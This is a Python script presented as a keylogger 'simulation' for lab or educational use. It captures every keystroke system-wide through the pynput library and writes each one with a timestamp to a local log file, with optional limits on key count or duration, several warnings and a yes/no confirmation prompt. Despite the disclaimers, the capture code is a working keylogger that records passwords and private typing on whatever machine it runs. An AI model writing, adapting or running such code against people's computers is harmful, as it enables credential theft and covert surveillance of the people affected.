#!/usr/bin/env python3
# KEYLOGGER SIMULATION - FOR CONTROLLED LAB/EDUCATIONAL USE ONLY
# DO NOT DEPLOY ON OTHERS' SYSTEMS - UNAUTHORIZED USE IS ILLEGAL

import os, time, argparse
from datetime import datetime
from pynput import keyboard

class KeyloggerSimulation:
    def __init__(self, log_file="keylog.txt", max_keys=None, duration=None):
        self.log_file = log_file
        self.max_keys = max_keys
        self.duration = duration
        self.key_count = 0
        self.start_time = time.time()
        self.running = False
        self.listener = None

    def on_key_press(self, key):
        if not self.running:
            return False
        if self.duration and (time.time() - self.start_time) > self.duration:
            print(f"\n[INFO] Time limit of {self.duration} seconds reached. Stopping...")
            self.stop_logging()
            return False
        if self.max_keys and self.key_count >= self.max_keys:
            print(f"\n[INFO] Key limit of {self.max_keys} keys reached. Stopping...")
            self.stop_logging()
            return False
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_data = key.char
            else:
                key_data = f"[{key.name}]" if hasattr(key, 'name') else str(key)
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f"{timestamp} - {key_data}\n")
            self.key_count += 1
            if self.key_count % 10 == 0:
                print(f"[INFO] Logged {self.key_count} keystrokes...")
        except Exception as e:
            print(f"[ERROR] Failed to log key: {e}")

    def start_logging(self):
        print(f"[WARNING] Starting keylogger simulation - FOR EDUCATIONAL USE ONLY")
        print(f"[INFO] Logging to: {os.path.abspath(self.log_file)}")
        if self.max_keys:
            print(f"[INFO] Will stop after {self.max_keys} keystrokes")
        if self.duration:
            print(f"[INFO] Will stop after {self.duration} seconds")
        print("[INFO] Press Ctrl+C to stop manually")
        print("-" * 50)
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write(f"KEYLOGGER SIMULATION LOG - STARTED: {datetime.now()}\n")
            f.write("=" * 60 + "\n")
        self.running = True
        self.start_time = time.time()
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        try:
            self.listener.join()
        except KeyboardInterrupt:
            print("\n[INFO] Manual stop requested...")
            self.stop_logging()

    def stop_logging(self):
        self.running = False
        if self.listener:
            self.listener.stop()
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"KEYLOGGER SIMULATION ENDED: {datetime.now()}\n")
            f.write(f"Total keystrokes logged: {self.key_count}\n")
        print(f"\n[INFO] Keylogger simulation stopped.")
        print(f"[INFO] Total keystrokes logged: {self.key_count}")
        print(f"[INFO] Log saved to: {os.path.abspath(self.log_file)}")

def main():
    parser = argparse.ArgumentParser(description="Keylogger Simulation - FOR EDUCATIONAL USE ONLY")
    parser.add_argument('--output', '-o', default='keylog.txt', help='Output log file (default: keylog.txt)')
    parser.add_argument('--max-keys', '-k', type=int, help='Maximum number of keystrokes to capture')
    parser.add_argument('--duration', '-d', type=int, help='Maximum duration in seconds')
    args = parser.parse_args()

    print("=" * 60)
    print("KEYLOGGER SIMULATION - EDUCATIONAL USE ONLY")
    print("=" * 60)
    print("WARNING: This tool is for cybersecurity education and research only.")
    print("Do NOT use on systems you don't own or without explicit permission.")
    print("Unauthorized keylogging is illegal and unethical.")
    print("=" * 60)

    confirm = input("Do you confirm this is for educational use in a lab environment? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Exiting. Use only for legitimate educational purposes.")
        return

    keylogger = KeyloggerSimulation(log_file=args.output, max_keys=args.max_keys, duration=args.duration)
    try:
        keylogger.start_logging()
    except Exception as e:
        print(f"[ERROR] Failed to start keylogger simulation: {e}")

if __name__ == "__main__":
    main()
